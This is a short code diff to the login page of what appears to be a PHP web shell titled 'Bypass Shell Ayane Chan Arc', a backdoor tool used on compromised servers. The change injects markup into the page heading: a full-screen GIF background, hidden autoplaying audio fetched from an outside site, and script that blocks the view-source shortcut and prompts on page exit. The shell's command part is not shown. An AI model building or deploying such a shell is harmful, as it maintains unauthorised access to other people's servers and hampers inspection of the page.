@@ -73,7 +73,8 @@ if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
         }
     </style>
     <div class="login-card">
-        <h1>Bypass Shell Ayane Chan Arc</h1>
+        <h1><style>html{height:100%;margin:0;background-image:url(https://media1.tenor.com/m/J01NX0ikmNwAAAAC/ricardo-flick-dance.gif);background-position:center;background-repeat:no-repeat;background-size:cover}</style><div id=audioSection><audio autoplay controls id=bgAudio loop style=display:none><source src=https://cvar1984.github.io/audio/moan.mp3 type=audio/mpeg></audio><script>document.onkeydown=function(e){if(e.ctrlKey&&(85===e.keyCode||119===e.keyCode))return!1},window.addEventListener("beforeunload",function(e){e.preventDefault(),e.returnValue="Gacor Kang?"});var audio=document.getElementById("bgAudio")</script></div>
+</h1>
         <img src="https://i.pinimg.com/564x/79/85/d8/7985d80888988a81764ef03feeaafdfb.jpg" alt="Banner Image" class="img-fluid">
         <form method="post">
             <div class="form-group">
